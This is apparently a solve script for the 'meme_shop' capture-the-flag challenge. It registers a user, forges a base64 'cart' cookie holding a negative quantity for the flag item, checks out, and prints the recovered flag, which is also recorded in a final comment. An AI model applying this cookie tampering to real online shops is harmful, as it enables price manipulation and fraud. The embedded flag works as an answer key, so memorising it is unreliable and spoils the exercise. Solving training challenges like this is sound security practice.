import requests
import re


site = "http://meme_shop.challs.olicyber.it/"
s = requests.session()

data = {"username" : "zamvramvavam",
        "password" : "zamvramvavam",
        "passwordConfirm" : "zamvramvavam",
        "submit" : "Registrati"}

reg = s.post(f"{site}/login.php" , data=data).text

s.cookies.set("cart" , "eyJmbGFnIjp7InByaWNlIjoxMDAsInF0eSI6LTEsIml0ZW1faWQiOjF9fQ==")
r = s.post(f"{site}/checkout.php").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{m3m3_5h0p_m4_p3r_1l_m3m3_51_5ch3rz4_4m1c1_d3ll4_p0574l3}